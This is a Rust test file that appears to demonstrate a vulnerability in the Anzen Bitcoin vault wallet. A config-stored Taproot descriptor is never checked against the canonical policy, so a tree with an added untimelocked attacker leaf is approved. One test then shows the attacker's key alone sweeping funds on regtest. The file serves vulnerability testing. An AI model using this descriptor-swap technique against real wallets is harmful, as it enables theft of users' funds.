//! Does anything bind `config.vault_descriptor` to the canonical Anzen policy?
//!
//! `load_config` is a bare `read_json`. `validate_batch` compares the manifest's descriptor
//! against the config's descriptor — both from the same place — and then builds the signing
//! policy from it. The hardware wallet checks that its *own* key matches
//! `config.hww_vault_pubkey` and that the phone signed the cooperative leaf, but never
//! recomputes `VaultPolicy::new_for_network(phone, hww)` and compares.
//!
//! So the question is whether a Taproot tree that merely *contains* the right cooperative leaf
//! is accepted, even when it also carries a leaf that lets someone else spend unilaterally.

use anzen::core::{
    ceremony::{PolicyLimits, build_policy_proposal},
    policy::{BIP341_NUMS_KEY, SpendPath, VaultPolicy},
    storage::{
        CONFIG_FILE, PHONE_DEVICE_FILE, VaultConfig, initialize_vault_for_network,
        load_device_keys, write_json,
    },
    transactions::{create_vault_psbt, finalize_vault_psbt},
    types::VaultUtxo,
};
use anzen::{cold_wallet, hot_wallet, hot_wallet::HotWallet};
use bitcoin::{
    Address, Amount, Network, OutPoint, Psbt, ScriptBuf, Sequence, Transaction, TxIn, TxOut, Txid,
    Witness, absolute,
    hashes::Hash,
    key::{Keypair, Secp256k1},
    secp256k1::{Message, XOnlyPublicKey},
    sighash::{Prevouts, SighashCache, TapSighashType},
    taproot::{self, LeafVersion, TapLeafHash},
    transaction::Version,
};
use chrono::{TimeZone, Utc};
use std::str::FromStr;

const VAULT_BALANCE: u64 = 200_000_000;
const MONTHLY_LIMIT: u64 = 10_000_000;

/// A tree with the genuine cooperative leaf, but whose second recovery leaf is a bare
/// `pk(attacker)` with no timelock at all.
fn hostile_descriptor(phone: &str, hww: &str, attacker: &str) -> String {
    format!(
        "tr({BIP341_NUMS_KEY},{{multi_a(2,{phone},{hww}),\
         {{and_v(v:older(61200),pk({phone})),pk({attacker})}}}})"
    )
}

#[test]
fn hww_approves_a_rollover_into_an_attacker_spendable_taproot_tree() {
    let secp = Secp256k1::new();
    let dir = tempfile::tempdir().unwrap();
    let data_dir = dir.path().to_path_buf();

    hot_wallet::initialize(&data_dir, Network::Regtest).unwrap();
    cold_wallet::initialize(&data_dir, Network::Regtest).unwrap();
    let honest = initialize_vault_for_network(&data_dir, Network::Regtest).unwrap();

    // The attacker's own key. Only its public half goes in the descriptor.
    let attacker = Keypair::new(&secp, &mut bitcoin::key::rand::thread_rng());
    let (attacker_pubkey, _) = XOnlyPublicKey::from_keypair(&attacker);

    let hostile = hostile_descriptor(
        &honest.phone_vault_pubkey,
        &honest.hww_vault_pubkey,
        &attacker_pubkey.to_string(),
    );
    let hostile_policy =
        VaultPolicy::from_descriptor_for_network(&hostile, Network::Regtest).unwrap();
    println!("honest  address: {}", honest.vault_address);
    println!("hostile address: {}", hostile_policy.address);
    assert_ne!(honest.vault_address, hostile_policy.address.to_string());

    // Rewrite the stored policy. Device pubkeys are left completely untouched.
    let mut config: VaultConfig = honest.clone();
    config.vault_descriptor = hostile.clone();
    config.vault_address = hostile_policy.address.to_string();
    write_json(&data_dir.join(CONFIG_FILE), &config).unwrap();

    // Build a proposal against the rewritten policy and have the HWW approve it.
    let vault_script = hostile_policy.address.script_pubkey();
    let utxo = VaultUtxo {
        outpoint: OutPoint::new(Txid::all_zeros(), 0),
        txout: TxOut {
            value: Amount::from_sat(VAULT_BALANCE),
            script_pubkey: vault_script.clone(),
        },
        confirmation_height: 1,
    };
    let batch = data_dir.join("batch");
    let phone = load_device_keys(&data_dir, PHONE_DEVICE_FILE).unwrap();
    let mut hot = HotWallet::open_or_create(&data_dir).unwrap();
    let manifest = build_policy_proposal(
        &config,
        &[utxo],
        Utc.with_ymd_and_hms(2026, 8, 3, 12, 0, 0).unwrap(),
        PolicyLimits {
            monthly_limit_sats: MONTHLY_LIMIT,
            emergency_access_limit_sats: 0,
        },
        &batch,
        &phone,
        &mut hot,
    )
    .expect("phone builds a proposal against the rewritten policy");

    let approved = cold_wallet::approve_policy(&data_dir, &batch);
    match &approved {
        Ok(m) => println!(
            "HWW APPROVED: hww_approved={} moving {} sats into the hostile tree",
            m.hww_approved, m.total_input_sats
        ),
        Err(error) => println!("HWW rejected: {error}"),
    }
    assert!(
        approved.is_err(),
        "the hardware wallet co-signed a rollover into a Taproot tree it never verified; \
         the tree carries pk(attacker) with no timelock, so the attacker can sweep every \
         output unilaterally"
    );
    let _ = manifest;
}

/// The attacker leaf really is unilaterally spendable, so the approval above is not cosmetic.
#[test]
fn the_hostile_leaf_is_unilaterally_spendable() {
    let secp = Secp256k1::new();
    let phone = anzen::core::keys::DeviceKeys::generate(&secp).unwrap();
    let hww = anzen::core::keys::DeviceKeys::generate(&secp).unwrap();
    let attacker = Keypair::new(&secp, &mut bitcoin::key::rand::thread_rng());
    let (attacker_pubkey, _) = XOnlyPublicKey::from_keypair(&attacker);

    let hostile = hostile_descriptor(
        &phone.vault_pubkey.to_string(),
        &hww.vault_pubkey.to_string(),
        &attacker_pubkey.to_string(),
    );
    let policy = VaultPolicy::from_descriptor_for_network(&hostile, Network::Regtest).unwrap();

    // The cooperative leaf is intact, which is why the ceremony's checks pass.
    let cooperative = policy.leaf(SpendPath::Cooperative).unwrap();
    assert_eq!(cooperative.depth, 1);
    assert!(
        cooperative
            .script
            .to_string()
            .contains(&phone.vault_pubkey.to_string())
    );

    // Now spend a vault output using only the attacker's key.
    let prevout = TxOut {
        value: Amount::from_sat(50_000),
        script_pubkey: policy.address.script_pubkey(),
    };
    let spend = Transaction {
        version: Version::TWO,
        lock_time: absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: OutPoint::new(Txid::all_zeros(), 0),
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![TxOut {
            value: Amount::from_sat(49_800),
            script_pubkey: ScriptBuf::new_p2tr(&secp, attacker_pubkey, None),
        }],
    };
    let mut psbt: Psbt = create_vault_psbt(spend, &[prevout.clone()], &policy).unwrap();

    let attacker_script =
        ScriptBuf::from_hex(&format!("20{}ac", hex_of(&attacker_pubkey.serialize()))).unwrap();
    let leaf_hash = TapLeafHash::from_script(&attacker_script, LeafVersion::TapScript);
    let unsigned = psbt.unsigned_tx.clone();
    let mut cache = SighashCache::new(&unsigned);
    let sighash = cache
        .taproot_script_spend_signature_hash(
            0,
            &Prevouts::All(&[prevout]),
            leaf_hash,
            TapSighashType::Default,
        )
        .unwrap();
    let signature =
        secp.sign_schnorr_no_aux_rand(&Message::from_digest(sighash.to_byte_array()), &attacker);
    psbt.inputs[0].tap_script_sigs.insert(
        (attacker_pubkey, leaf_hash),
        taproot::Signature {
            signature,
            sighash_type: TapSighashType::Default,
        },
    );

    let stolen = finalize_vault_psbt(psbt).expect("attacker alone finalizes the hostile leaf");
    println!(
        "attacker swept {} sats alone; witness items = {}",
        stolen.output[0].value.to_sat(),
        stolen.input[0].witness.len()
    );
    assert_eq!(
        stolen.input[0].witness.len(),
        3,
        "sig + script + control block"
    );
}

fn hex_of(bytes: &[u8]) -> String {
    use std::fmt::Write;
    bytes.iter().fold(String::new(), |mut out, byte| {
        let _ = write!(out, "{byte:02x}");
        out
    })
}

/// Control: the honest descriptor is accepted, so the harness exercises the real path.
#[test]
fn control_the_canonical_descriptor_is_accepted() {
    let dir = tempfile::tempdir().unwrap();
    let data_dir = dir.path().to_path_buf();
    hot_wallet::initialize(&data_dir, Network::Regtest).unwrap();
    cold_wallet::initialize(&data_dir, Network::Regtest).unwrap();
    let config = initialize_vault_for_network(&data_dir, Network::Regtest).unwrap();

    let vault_script = Address::from_str(&config.vault_address)
        .unwrap()
        .require_network(Network::Regtest)
        .unwrap()
        .script_pubkey();
    let utxo = VaultUtxo {
        outpoint: OutPoint::new(Txid::all_zeros(), 0),
        txout: TxOut {
            value: Amount::from_sat(VAULT_BALANCE),
            script_pubkey: vault_script,
        },
        confirmation_height: 1,
    };
    let batch = data_dir.join("batch");
    let phone = load_device_keys(&data_dir, PHONE_DEVICE_FILE).unwrap();
    let mut hot = HotWallet::open_or_create(&data_dir).unwrap();
    build_policy_proposal(
        &config,
        &[utxo],
        Utc.with_ymd_and_hms(2026, 8, 3, 12, 0, 0).unwrap(),
        PolicyLimits {
            monthly_limit_sats: MONTHLY_LIMIT,
            emergency_access_limit_sats: 0,
        },
        &batch,
        &phone,
        &mut hot,
    )
    .unwrap();
    cold_wallet::approve_policy(&data_dir, &batch).expect("honest policy must still be approved");
}
